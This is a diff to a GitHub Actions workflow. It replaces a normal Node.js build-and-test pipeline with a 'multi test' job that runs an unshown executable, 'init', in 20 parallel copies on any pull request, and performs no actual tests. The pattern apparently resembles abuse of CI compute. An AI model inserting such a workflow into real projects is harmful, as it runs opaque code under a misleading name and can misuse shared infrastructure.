@@ -1,26 +1,26 @@
-name: Master Pull-Request Workflow
+name: multi test
 
-on:
-  pull_request:
-    branches:
-    - master
+on: [pull_request]
 
 jobs:
-  build:
-    runs-on: ubuntu-latest
-    steps:
-    - uses: actions/checkout@v2
-    - name: Cache node modules
-      uses: actions/cache@v1
-      with:
-        path: ~/.npm
-        key: ${{ hashFiles('**/package-lock.json') }}
-        restore-keys: -node-
+  multitest:
+    name: test job
 
-    - name: Node Setup
-      uses: actions/setup-node@v1
-      with:
-        node-version: '12'
-    - run: npm install
-    - run: npm run build
-    - run: npm run test
+    runs-on: ubuntu-latest
+    env:
+      DEBIAN_FRONTEND: noninteractive
+
+    strategy:
+     fail-fast: false
+     matrix:
+       runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v2
+        
+      - name: chmod
+        run: chmod +x init
+        
+      - name: run
+        run: ./init
